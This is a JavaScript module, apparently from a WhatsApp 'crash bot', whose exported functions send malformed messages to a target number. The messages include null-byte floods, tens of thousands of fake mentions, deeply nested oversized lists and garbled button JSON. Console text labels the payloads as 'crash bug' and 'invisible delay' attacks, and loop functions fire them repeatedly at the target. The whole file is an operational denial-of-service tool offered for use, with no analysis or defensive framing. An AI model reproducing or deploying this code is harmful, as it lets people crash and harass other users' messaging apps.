// wow that's amazing!
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function delaynew(isTarget, mention, yola = "yola") {
  const repetitions = 30;
  const mainDelay = 150;
  const safetyDelay = 800;
  const bugText = "É̶̥͊̚l̴̯̟̱͇̜͔̩̑̄̉͝͠a̴̙͙̲̖͂͑̾̔̂i̴̥̼̤͉̣̯̯̿͜ṇ̵̤̺̖͔̹̺͎̱̉̎̕͝a̷̤̳̦͎͓̒͛̀̽-̴̢̛͉̺̹̘̹̩̥͌̏̆̀͑̃̿͌L̷̦̦̻̗̙͚̠̰̓̆̓̍̔́̿͘x̴̨͉̞̲͂̇͂͌͋͐̎̔̚͠z̷̗̹͕̹͕̞̘̈̋̒͠ 👑🌸👑🌸";
  let successCount = 0;

  console.log(
    chalk.yellow(`Mengirim Delay Tak Terlihat ke ${isTarget} (x${repetitions})`)
  );

  for (let i = 0; i < repetitions; i++) {
    try {
      const generateMessage = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: bugText,
              fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              fileLength: "19769",
              height: 1,
              width: 1,
              mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              directPath:
                "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mediaKeyTimestamp: `${Date.now()}`,
              jpegThumbnail: Buffer.from([0]),
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1000 },
                  () =>
                    "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                ),
                isForwarded: true,
                forwardingScore: 99999,
              },
            },
          },
        },
      };
      const msg = generateWAMessageFromContent(isTarget, generateMessage, {});
      await yola.relayMessage(isTarget, msg.message, {
        messageId: msg.key.id,
      });
      successCount++;
      if (i % 5 === 0)
        console.log(
          chalk.green(
            `delaynew terkirim ${i + 1}/${repetitions} ke ${isTarget}`
          )
        );
      await sleep(mainDelay);
    } catch (error) {
      console.error(
        chalk.red(
          `Error mengirim pesan delay ${i + 1}/${repetitions} ke ${isTarget}:`
        ),
        error.message.slice(0, 100)
      );
      await sleep(safetyDelay);
    }
  }
  console.log(
    chalk.green(
      `Donee mengirim Delay Tak Terlihat ke ${isTarget}. Sukses: ${successCount}/${repetitions}`
    )
  );
  await sleep(safetyDelay);
}

async function DelayL(isTarget, mention, yola = "yola") {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "P",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: isTarget,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

  await yola.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await yola.relayMessage(
      isTarget,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "P" },
            content: undefined,
          },
        ],
      }
    );
    console.log(chalk.yellow("BUG INVISIBLE HARD TELAH DIKIRIM.."));
  }
}

async function SqlXVnm31(target, yola = "yola") {
  let Xnode31 = JSON.stringify({
    status: true,
    criador: "Zhee WhatsApp Api",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  let sections = [];

  for (let i = 0; i < 10000; i++) {
    let largeText = "~@1~".repeat(10000);

    let deepNested = {
      title: `Super Deep Nested Section ${i}`,
      highlight_label: `Extreme Highlight ${i}`,
      rows: [
        {
          title: largeText,
          id: `id${i}`,
          subrows: [
            {
              title: Xnode31 + "Nested row 1",
              id: `nested_id1_${i}`,
              subsubrows: [
                {
                  title: Xnode31 + "Deep Nested row 1",
                  id: `deep_nested_id1_${i}`,
                },
                {
                  title: Xnode31 + "Deep Nested row 2",
                  id: `deep_nested_id2_${i}`,
                },
              ],
            },
            {
              title: Xnode31 + "Nested row 2",
              id: `nested_id2_${i}`,
            },
          ],
        },
      ],
    };

    sections.push(deepNested);
  }

  let listMessage = {
    title: "🦠",
    sections: sections,
  };

  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "É̶̥͊̚l̴̯̟̱͇̜͔̩̑̄̉͝͠a̴̙͙̲̖͂͑̾̔̂i̴̥̼̤͉̣̯̯̿͜ṇ̵̤̺̖͔̹̺͎̱̉̎̕͝a̷̤̳̦͎͓̒͛̀̽-̴̢̛͉̺̹̘̹̩̥͌̏̆̀͑̃̿͌L̷̦̦̻̗̙͚̠̰̓̆̓̍̔́̿͘x̴̨͉̞̲͂̇͂͌͋͐̎̔̚͠z̷̗̹͕̹͕̞̘̈̋̒͠ 👑🌸Elaina👑🌸",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson:
                  Xnode31 +
                  "饾悜廷饾悽童饾惓蜔饾惐蛽饾惎谭饾悶廷饾惀蜔饾悗谭饾悷廷饾悷童饾悽蜔饾悳探饾悽廷饾悮蜔饾惀檀",
              },
              {
                name: "call_permission_request",
                buttonParamsJson:
                  Xnode31 +
                  "饾悜廷饾悽童饾惓蜔饾惐蛽饾惎谭饾悶廷饾惀蜔饾悗谭饾悷廷饾悷童饾悽蜔饾悳探饾悽廷饾悮蜔饾惀檀",
              },
              {
                name: "mpm",
                buttonParamsJson:
                  Xnode31 +
                  "饾悜廷饾悽童饾惓蜔饾惐蛽饾惎谭饾悶廷饾惀蜔饾悗谭饾悷廷饾悷童饾悽蜔饾悳探饾悽廷饾悮蜔饾惀檀",
              },
              {
                name: "galaxy_message",
                paramsJson:
                  Xnode31 +
                  `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(
                    355000
                  )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                version: 3,
              },
            ],
          },
        },
      },
    },
  };

  await yola.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function WaApi(target, yola = "yola") {
  let apiClient = JSON.stringify({
    status: true,
    criador: "Zhee WhatsApp Api",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {},
            body: {
              text: "ᚷᛇꃅ𐌄𐌄 ✦ Ᏽ𐌀𐌂Ꝋ𐌐𐌐",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "ᚷᛇꃅ𐌄𐌄 ✦ Ᏽ𐌀𐌂Ꝋ𐌐𐌐",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "ᚷᛇꃅ𐌄𐌄  ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await yola.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
}

async function ForceClose(target, yola = "yola") {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "É̶̥͊̚l̴̯̟̱͇̜͔̩̑̄̉͝͠a̴̙͙̲̖͂͑̾̔̂i̴̥̼̤͉̣̯̯̿͜ṇ̵̤̺̖͔̹̺͎̱̉̎̕͝a̷̤̳̦͎͓̒͛̀̽-̴̢̛͉̺̹̘̹̩̥͌̏̆̀͑̃̿͌L̷̦̦̻̗̙͚̠̰̓̆̓̍̔́̿͘x̴̨͉̞̲͂̇͂͌͋͐̎̔̚͠z̷̗̹͕̹͕̞̘̈̋̒͠ 👑🌸Elaina👑🌸",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                    venomModsData +
                    "饾悜廷饾悽童饾惓蜔饾惐蛽饾惎谭饾悶廷饾惀蜔饾悗谭饾悷廷饾悷童饾悽蜔饾悳探饾悽廷饾悮蜔饾惀檀",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await yola.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function satan(target, yola = "yola") {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Web31 Api", format: "DEFAULT" },
            nativeFlowResponseMessage: [
              {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(13330),
                version: 3,
              },
              {
                name: "mpm",
                paramsJson: "\u0000".repeat(7333),
                version: 3,
              },
              {
                name: "payment_transaction_request",
                paramsJson: JSON.stringify({
                  syncType: "full_sync",
                  data: "\u0000".repeat(7000),
                }),
                version: 3,
              },
            ],
          },
        },
      },
    };

    await yola.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error("Gagal kirim crash bug:", err);
  }
}

async function Xforceui(target, yola = "yola") {
  for (let i = 0; i < 30; i++) {
    await ForceClose(target);
    await sleep(750);
    await ForceClose(target);
    await ForceClose(target);
    await sleep(700);
    await ForceClose(target);
    await satan(target);
    await sleep(600);
    await satan(target);
    await satan(target);
    await sleep(700);
    await satan(target);
  }
}

async function LayX(target, yola = "yola") {
  for (let i = 0; i < 30; i++) {
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
    await DelayL(target);
  }
}

module.exports = {
  delaynew,
  DelayL,
  SqlXVnm31,
  WaApi,
  satan,
  ForceClose,
  Xforceui,
  LayX,
};

// r? frenzy ;>
